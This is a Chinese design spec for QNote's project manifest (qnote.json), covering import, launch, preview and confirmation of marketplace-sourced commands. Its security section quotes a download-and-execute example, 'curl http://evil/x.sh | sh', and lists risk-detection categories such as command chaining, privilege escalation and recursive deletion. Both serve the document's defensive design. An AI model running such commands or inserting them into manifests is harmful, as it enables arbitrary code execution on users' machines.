# 应用管理 —— 项目清单规范

> QNote 的「应用」标签页用来管理本机上的 vibe coding 产物。
> 这份文档是**规范本体**：一个文件夹要成为「可管理的项目」，需要满足什么条件、
> 清单怎么写、各字段什么含义。
>
> 实现位置：主进程 `src/main/core/appManager.ts`（导入与进程）、
> `src/main/core/window/appPreview.ts`（预览）、`src/main/utils/appManifest.ts`（清单校验）。

---

## 一、导入模型

**导入的就是项目本身。**

在「应用」页点「导入文件夹」，选中的那个文件夹就是一个项目 ——
不需要先指定一个根目录，也不需要把项目塞进同一棵树里。

```
D:\work\pomodoro\        ← 一个项目
E:\side\html-tool\       ← 另一个项目
F:\external\scratch\     ← 第三个项目
```

三个项目互不相干，可以散落在任意不同的路径下（不同盘符、外接硬盘、
网络映射盘都行）。数据库里记的是每个项目的绝对路径。

为什么不做成「选根目录 → 扫描其下子文件夹」：那种模型要求所有项目挤在
同一棵目录下，项目一多就只能不停换根目录，而且散落的项目根本看不见。
导入模型没有这个问题 —— 一个项目一个文件夹，各管各的。

---

## 二、清单格式

项目根目录（与被管理的产物同级）放一份 `qnote.json`：

```json
{
  "name": "番茄钟",
  "description": "一个网页版番茄钟",
  "command": "node server.js",
  "args": ["--port", "3000"],
  "cwd": ".",
  "env": { "NODE_ENV": "production" },
  "preview": "dist/index.html"
}
```

### 字段

| 字段 | 类型 | 必填 | 说明 |
| --- | --- | --- | --- |
| `name` | string | 否 | 界面上的显示名。省略时用文件夹名 |
| `description` | string | 否 | 一句话说明，仅展示 |
| `command` | string | 二选一 | 启动命令，在 `cwd` 下经 shell 执行 |
| `args` | string[] | 否 | 追加给命令的参数。含空格的参数会自动加引号 |
| `cwd` | string | 否 | 工作目录，相对项目根。默认项目根本身。**不允许指向项目外** |
| `env` | object | 否 | 额外环境变量，值必须是字符串/数字/布尔 |
| `preview` | string | 二选一 | 要预览的页面。相对路径或 `http(s)` 网址 |

`command` 与 `preview` **至少要填一个**。两者都空的清单不合法 ——
这样的项目既跑不起来也没东西可看，加进列表只是噪声。

### 校验规则

清单在**主进程写文件前**校验一次，解析不通过时不会落盘：

- 顶层必须是对象
- `command` 必须是非空字符串
- `args` 必须是字符串数组
- `env` 的值必须是字符串 / 数字 / 布尔（写数字会自动转成字符串）
- `preview` 必须是字符串
- `command` 与 `preview` 至少有一个

未知字段会被忽略 —— 以后加字段不会让旧清单失效。

## 三、导入一个文件夹

导入时按顺序判定：

| 情况 | 结果 | 界面上的动作 |
| --- | --- | --- |
| 清单合法 | 导入成功 | 项目出现在列表里，自动选中 |
| 没有 `qnote.json` | 不落库 | 打开清单编辑器，补完自动导入 |
| 清单解析不过 | 不落库 | 打开清单编辑器并显示错在哪，改完自动导入 |
| 已经导入过 | 不落库 | 提示「这个项目已经导入了」 |
| 选中的不是文件夹 | 不落库 | 提示「选中的不是文件夹」 |

「不合规就不落库」是刻意的：一个跑不起来的空壳留在列表里，
只会让人以为应用坏了。补清单的编辑器是同一条路径 —— 补完直接导入，
用户不用把「选文件夹」重来一遍。

---

## 四、启动行为

`command` 以**常驻进程**运行：

- 在 `cwd` 下用 shell 启动，进程不会自己退出就一直跑
- 标准输出与错误输出实时收集，在界面的「运行输出」控制台里显示
- 点「停止」结束进程。Windows 上按进程树杀（`taskkill /T`），
  不会留下后台还在跑的子进程
- 应用退出时所有常驻进程会被同步收掉 —— 关掉 QNote 就是真的停了

命令找不到、工作目录不存在时，启动会失败并在控制台里说明原因。

## 五、预览行为

`preview` 有两种写法：

| 写法 | 含义 |
| --- | --- |
| `index.html`、`dist/index.html` | 项目内的文件，相对项目根解析 |
| `http://localhost:3000` | 直接加载那个网址（比如启动命令拉起来的 dev server） |

项目内文件通过私有协议 `qnote-app://p<项目ID>/...` 提供，由主进程直接读文件返回。

**为什么不用 `file://`**：Chromium 在 `file://` 下会以 CORS 为由拦掉
`<script type="module">`，绝大多数 vite / esbuild 产物都是 ESM，一打开就是白屏。
私有协议把它当成正常的安全来源，ES module、`fetch` 同源资源都能正常工作。

每个项目一个独立来源（`qnote-app://p12` 与 `qnote-app://p13` 互不相同），
项目之间读不到对方的文件。

## 六、界面上的项目状态

| 状态 | 含义 | 能做什么 |
| --- | --- | --- |
| 可用 | 清单合法 | 启动、预览、编辑清单 |
| 未配置 | 目录下没有 `qnote.json` | 点「生成 qnote.json」补一份 |
| 清单有误 | 有 `qnote.json` 但解析不过 | 显示具体错在哪，改完刷新即生效 |

状态是在**导入时**与**刷新清单时**判定的。清单在项目文件夹里，
用户随时可能改它 —— 改完点「刷新清单」就生效，不用重启应用。

---

## 七、写在项目里还是写在应用里

清单**写在项目文件夹里**，不放应用数据库。

理由：项目要能被别的工具、别的机器、版本库识别。清单跟着项目走，
`qnote.json` 本身也是一份能提交进 git 的说明文件；放在应用的数据库里，
项目一旦被拷走就失去了被管理的能力。

应用数据库（`app_project` 表）只存**索引**：项目路径、展示名、
清单解析结果、排序位。清单原文仍然以文件为准，每次刷新都重新读一遍。

## 七之二、来源标记与启动确认

> 这一节讲的是**从应用市场获取**的项目 —— 它的清单是别人写的。

### 为什么要有这个

清单里的 `command` 是**经 shell 执行**的（`spawn(..., shell: true)`）。
这意味着 `;` `&&` `|` `$(` 这些 shell 元字符都会被解释 ——
`curl http://evil/x.sh | sh` 在清单里**语法完全合法**，跑起来就是任意代码执行。

而清单的语法校验（`parseManifestText`）只管「字段对不对」，
管不了「这条命令安不安全」—— 任何 shell 命令在语法上都是合法的。

所以按**来源**分级：

| 来源 | 清单是谁写的 | 启动前 |
| --- | --- | --- |
| `local` | 用户自己 | 直接跑 |
| `market` | 应用市场的发布者 | **必须先确认** |

### 来源存在哪

`app_project` 表的两列：

| 列 | 含义 |
| --- | --- |
| `origin` | `'local'`（本机导入）/ `'market'`（市场获取） |
| `confirmed_manifest_hash` | 用户**确认过的清单指纹** |

老库迁移时 `origin` 默认 `'local'` —— 老项目全是用户自己导入的。

### 确认的是「这份清单」，不是「这个应用」

`confirmed_manifest_hash` 存的是**清单内容的哈希**，不是布尔值。

- 清单改了（作者更新、本地被人动过）→ 哈希对不上 → **确认框再弹一次**
- 确认框弹出之后清单又被改了 → 用户带回来的旧指纹对不上当前清单 → **不记，继续问**

所以它防的不只是「第一次」，也包括「确认之后清单被换掉」。

### 确认框里给用户看什么

1. **完整命令行** —— 不截断。用户要能自己看清楚到底会跑什么
2. **风险分析** —— 命令里可疑的地方（`src/shared/appRisk.ts`）
3. **来源** —— 来自市场，附发布者署名

风险分三档：

| 级别 | 什么时候 | 确认强度 |
| --- | --- | --- |
| `none` | 没命中任何规则 | 点「运行」 |
| `caution` | 命中 caution 级规则（重定向、调解释器、碰凭据路径…） | 点「运行」 |
| `danger` | 命中 danger 级规则（命令分隔符、下载即执行、提权、递归删除…） | 额外要**显式勾选**「我知道风险」 |

### 风险分析不是安全边界

关键词匹配挡不住刻意伪装 —— 换个可执行文件、先下载再执行、
编码载荷都能绕过。真正的防线是**来源标记 + 运行前确认**：
跑不跑由用户点确认框决定。风险分析只是给那个框提供信息，
让用户看得懂，不是替用户做决定。

### 从市场导入不覆盖已有清单

「获取」一个应用时，如果目标文件夹里**已经有** `qnote.json`，
主进程会**拒绝**并提示换个空文件夹 —— 一个字节都不动。

理由：那一步如果覆盖了，用户自己已有项目的清单就被换成了别人的命令。
他根本不会意识到，下次点**自己那个项目**的「启动」就跑了别人的东西。

所以市场导入走的是**专用路径**（`app:import-from-market`），
一次做完「查 → 写 → 导入」，而不是「写清单」+「导入项目」两步 ——
两步分开的话，清单已经写了，导入才发现失败。

## 八、快速上手

```bash
# 1. 建一个项目目录
mkdir ~/projects/pomodoro && cd ~/projects/pomodoro

# 2. 写清单
cat > qnote.json <<'EOF'
{
  "name": "番茄钟",
  "command": "python main.py",
  "preview": "index.html"
}
EOF

# 3. 在 QNote 的「应用」页点「导入文件夹」，选 ~/projects/pomodoro
```

## 九、目前不支持的（第一阶段范围）

- 只支持**脚本**与 **HTML**。没有容器化、没有依赖自动安装、
  没有端口探测与自动打开浏览器
- 没有远程仓库同步 —— 项目必须是本机路径
- 一次只运行一个实例（同一项目重复启动会被拒绝）
